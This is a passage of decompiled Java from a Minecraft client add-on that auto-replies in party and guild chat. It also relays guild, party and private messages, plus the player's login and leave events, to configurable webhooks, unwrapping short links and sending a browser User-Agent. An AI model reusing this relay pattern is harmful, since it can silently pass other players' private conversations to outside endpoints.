/*     */   public void onServerDisconnect(ConnectionEvent.Disconnect event) {
/* 597 */     if (!((Boolean)this.loginNotifierWebhookEnabled.getValue()).booleanValue())
/* 598 */       return;  if ("leave".equals(this.lastLoginNotifierEvent))
/* 599 */       return;  String username = getCurrentUsername();
/*     */ 
/*     */     
/* 603 */     postToConfiguredWebhook((String)this.loginNotifierWebhook.getValue(), username + " Left " + username + ".");
/* 604 */     this.lastLoginNotifierEvent = "leave";
/*     */   }
/*     */   
/*     */   private void registerCommand(int category, String trigger, String... lines) {
/* 608 */     String key = trigger.toLowerCase(Locale.ROOT);
/* 609 */     this.commandCategories.put(key, Integer.valueOf(category));
/* 610 */     addCommandToCategoryList(category, trigger);
/*     */     
/* 612 */     List<ScheduledLine> scheduled = new ArrayList<>();
/* 613 */     for (int i = 0; i < lines.length; i++) {
/* 614 */       long delay = 200L + 1000L * i;
/* 615 */       scheduled.add(new ScheduledLine(delay, lines[i]));
/*     */     } 
/* 617 */     this.commandResponses.put(key, scheduled);
/*     */   }
/*     */   
/*     */   private void registerCommandWithDelays(int category, String trigger, long[] delays, String[] lines) {
/* 621 */     if (delays.length != lines.length) {
/* 622 */       throw new IllegalArgumentException("Delay count must match line count for " + trigger);
/*     */     }
/*     */     
/* 625 */     String key = trigger.toLowerCase(Locale.ROOT);
/* 626 */     this.commandCategories.put(key, Integer.valueOf(category));
/* 627 */     addCommandToCategoryList(category, trigger);
/*     */     
/* 629 */     List<ScheduledLine> scheduled = new ArrayList<>();
/* 630 */     for (int i = 0; i < lines.length; i++) {
/* 631 */       scheduled.add(new ScheduledLine(delays[i], lines[i]));
/*     */     }
/* 633 */     this.commandResponses.put(key, scheduled);
/*     */   }
/*     */   
/*     */   private void addCommandToCategoryList(int category, String trigger) {
/* 637 */     if (category == 1) {
/* 638 */       this.category1Commands.add(trigger);
/* 639 */     } else if (category == 2) {
/* 640 */       this.category2Commands.add(trigger);
/* 641 */     } else if (category == 3) {
/* 642 */       this.category3Commands.add(trigger);
/*     */     } else {
/* 644 */       throw new IllegalArgumentException("Unsupported command category: " + category);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void registerOtherCommand(String name) {
/* 649 */     this.otherCommands.add(name);
/*     */   }
/*     */   
/*     */   private boolean isCommandEnabled(String command) {
/* 653 */     Integer category = this.commandCategories.get(command);
/* 654 */     if (category == null) {
/* 655 */       return false;
/*     */     }
/*     */     
/* 658 */     if (category.intValue() == 1) return this.chatCommands1.getValuesList().contains(command); 
/* 659 */     if (category.intValue() == 2) return this.chatCommands2.getValuesList().contains(command); 
/* 660 */     if (category.intValue() == 3) return this.chatCommands3.getValuesList().contains(command);
/*     */     
/* 662 */     return false;
/*     */   }
/*     */   
/*     */   private void setCategoryEnabled(MultiBoolSetting setting, List<String> options, boolean enabled) {
/* 666 */     for (String option : options) {
/* 667 */       setting.set(option, enabled);
/*     */     }
/*     */   }
/*     */   
/*     */   private void scheduleResponses(List<ScheduledLine> lines, String chatPrefix) {
/* 672 */     for (ScheduledLine line : lines) {
/* 673 */       CompletableFuture.delayedExecutor(line.delayMs(), TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730(formatChatCommand(line.command(), chatPrefix))));
/*     */     }
/*     */   }
/*     */   
/*     */   private String formatChatCommand(String raw, String chatPrefix) {
/* 677 */     String out = raw;
/* 678 */     if (out == null) return chatPrefix;
/* 679 */     out = out.trim();
/* 680 */     if (out.startsWith("/pc ")) out = out.substring(4);
/* 681 */     else if (out.startsWith("pc ")) out = out.substring(3);
/* 682 */     else if (out.startsWith("/gc ")) out = out.substring(4);
/* 683 */     else if (out.startsWith("gc ")) out = out.substring(3);
/* 684 */     return chatPrefix + " " + out;
/*     */   }
/*     */   
/*     */   private boolean isPartyChatMessage(String raw, String stripped) {
/* 688 */     if (stripped != null && stripped.startsWith("Party >")) return true; 
/* 689 */     if (raw == null) return false; 
/* 690 */     return (raw.startsWith("Party >") || raw.startsWith("§9Party >"));
/*     */   }
/*     */   
/*     */   private boolean isGuildChatMessage(String raw, String stripped) {
/* 694 */     if (stripped != null && stripped.startsWith("Guild >")) return true; 
/* 695 */     if (raw == null) return false; 
/* 696 */     return (raw.startsWith("Guild >") || raw.startsWith("§2Guild >"));
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void sendWebhookMessage(String message) {
/* 684 */     if (!((Boolean)this.webhookEnabled.getValue()).booleanValue())
/* 685 */       return;  if (message == null || message.isEmpty())
/*     */       return; 
/* 687 */     String clean = class_124.method_539(message);
/*     */ 
/*     */     
/* 690 */     String content = (clean.length() > 1900) ? (clean.substring(0, 1897) + "...") : clean;
/*     */     
/* 692 */     if (((Boolean)this.guildChatWebhookEnabled.getValue()).booleanValue() && clean.contains("Guild > ")) {
/* 693 */       postToConfiguredWebhook((String)this.guildChatWebhook.getValue(), content);
/*     */     }
/* 695 */     if (((Boolean)this.partyChatWebhookEnabled.getValue()).booleanValue() && clean.contains("Party > ")) {
/* 696 */       postToConfiguredWebhook((String)this.partyChatWebhook.getValue(), content);
/*     */     }
/* 698 */     if (((Boolean)this.privateMessagesWebhookEnabled.getValue()).booleanValue() && (clean.contains("To ") || clean.contains("From "))) {
/* 699 */       postToConfiguredWebhook((String)this.privateMessagesWebhook.getValue(), content);
/*     */     }
/*     */     
/* 702 */     String inputUrl = (String)this.webhookLink.getValue();
/* 703 */     if (inputUrl == null)
/* 704 */       return;  inputUrl = inputUrl.trim();
/* 705 */     if (inputUrl.isEmpty())
/*     */       return; 
/* 707 */     if (containsHeartSymbol(clean)) {
/*     */       return;
/*     */     }
/* 710 */     for (String ignored : WEBHOOK_IGNORE) {
/* 711 */       if (clean.contains(ignored)) {
/*     */         return;
/*     */       }
/*     */     } 
/*     */     
/* 716 */     String resolvedUrl = getResolvedWebhookUrl(inputUrl);
/* 717 */     if (resolvedUrl == null || resolvedUrl.isBlank()) {
/*     */       return;
/*     */     }
/* 720 */     postWebhook(resolvedUrl, content);
/*     */   }
/*     */   
/*     */   private boolean postToConfiguredWebhook(String inputUrl, String content) {
/* 724 */     if (inputUrl == null) return false; 
/* 725 */     String trimmed = inputUrl.trim();
/* 726 */     if (trimmed.isEmpty()) return false; 
/* 727 */     String resolvedUrl = getResolvedWebhookUrl(trimmed);
/* 728 */     if (resolvedUrl == null || resolvedUrl.isBlank()) return false; 
/* 729 */     postWebhook(resolvedUrl, content);
/* 730 */     return true;
/*     */   }
/*     */   
/*     */   private boolean containsHeartSymbol(String text) {
/* 734 */     return (text.contains("❤") || text
/* 735 */       .contains("♥") || text
/* 736 */       .contains("❤️") || text
/* 737 */       .contains("â¤") || text
/* 738 */       .contains("Ã¢ÂÂ¤"));
/*     */   }
/*     */   
/*     */   private String getCurrentUsername() {
/*     */     try {
/* 743 */       String name = (this.mc.method_1548() == null) ? null : this.mc.method_1548().method_1676();
/* 744 */       if (name != null && !name.isBlank()) {
/* 745 */         return name;
/*     */       }
/* 747 */     } catch (Exception exception) {}
/*     */     
/* 749 */     return "unknown";
/*     */   }
/*     */   
/*     */   private String getCurrentServerAddress() {
/*     */     try {
/* 754 */       if (this.mc.method_1558() != null && (this.mc.method_1558()).field_3761 != null && !(this.mc.method_1558()).field_3761.isBlank()) {
/* 755 */         return (this.mc.method_1558()).field_3761;
/*     */       }
/* 757 */     } catch (Exception exception) {}
/*     */     
/* 759 */     return "unknown";
/*     */   }
/*     */   
/*     */   private String getResolvedWebhookUrl(String inputUrl) {
/* 763 */     if (inputUrl.equals(this.cachedWebhookInput) && !this.cachedWebhookResolved.isBlank()) {
/* 764 */       return this.cachedWebhookResolved;
/*     */     }
/*     */     
/* 767 */     String resolved = resolveWebhookUrl(inputUrl);
/* 768 */     this.cachedWebhookInput = inputUrl;
/* 769 */     this.cachedWebhookResolved = (resolved == null) ? "" : resolved.trim();
/* 770 */     return this.cachedWebhookResolved;
/*     */   }
/*     */   
/*     */   private String resolveWebhookUrl(String url) {
/* 774 */     String lower = url.toLowerCase(Locale.ROOT);
/* 775 */     boolean isTiny = (lower.contains("tinyurl.com/") || lower.contains("tiny.one/"));
/* 776 */     if (!isTiny) {
/* 777 */       return url;
/*     */     }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*     */     try {
/* 786 */       HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36").header("Accept", "*/*").GET().build();
/*     */       
/* 788 */       HttpResponse<Void> response = REDIRECT_CLIENT.send(request, HttpResponse.BodyHandlers.discarding());
/* 789 */       URI finalUri = response.uri();
/* 790 */       return (finalUri == null) ? url : finalUri.toString();
/* 791 */     } catch (Exception ex) {
/* 792 */       return url;
/*     */     } 
/*     */   }
/*     */   private void postWebhook(String url, String content) {
/*     */     HttpRequest request;
/* 797 */     String json = "{\"content\":\"" + escapeJson(content) + "\"}";
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*     */     try {
/* 806 */       request = HttpRequest.newBuilder().uri(URI.create(url)).header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36").header("Accept", "*/*").header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(json)).build();
/* 807 */     } catch (IllegalArgumentException ex) {
/*     */       return;
/*     */     } 
/*     */     
/* 811 */     HTTP_CLIENT.<Void>sendAsync(request, HttpResponse.BodyHandlers.discarding())
/* 812 */       .exceptionally(ex -> null);
/*     */   }
/*     */   
/*     */   private String escapeJson(String input) {
/* 816 */     return input
/* 817 */       .replace("\\", "\\\\")
/* 818 */       .replace("\"", "\\\"")
/* 819 */       .replace("\n", "\\n")
/* 820 */       .replace("\r", "\\r")
/* 821 */       .replace("\t", "\\t");
/*     */   }
/*     */   
/*     */   private void sendPtThenW() {
/* 825 */     if (!isEnabled() || !((Boolean)this.miscEnabled.getValue()).booleanValue())
/* 826 */       return;  if (this.mc.field_1724 == null || this.mc.field_1724.field_3944 == null)
/*     */       return; 
/* 828 */     this.mc.field_1724.field_3944.method_45730("pc !pt");
/* 829 */     CompletableFuture.delayedExecutor(400L, TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730("pc !w")));
/*     */   }
/*     */   
/*     */   private String extractEventMessage(Object event) {
/*     */     if (event == null) {
/*     */       return "";
/*     */     }
/*     */     try {
/*     */       Object message = event.getClass().getMethod("getMessage").invoke(event);
/*     */       if (message == null) {
/*     */         return "";
/*     */       }
/*     */       if (message instanceof String) {
/*     */         return (String)message;
/*     */       }
/*     */       try {
/*     */         Object text = message.getClass().getMethod("getString").invoke(message);
/*     */         return (text == null) ? "" : text.toString();
/*     */       } catch (ReflectiveOperationException ignored) {
/*     */         return message.toString();
/*     */       } 
/*     */     } catch (ReflectiveOperationException ignored) {
/*     */       return "";
/*     */     } 
/*     */   }
/*     */ }


/* Location:              F:\exampleaddon-1.0.0.jar!\com\example\module\impl\ChatCommands.class
 * Java compiler version: 21 (65.0)
 * JD-Core Version:       1.1.3
 */
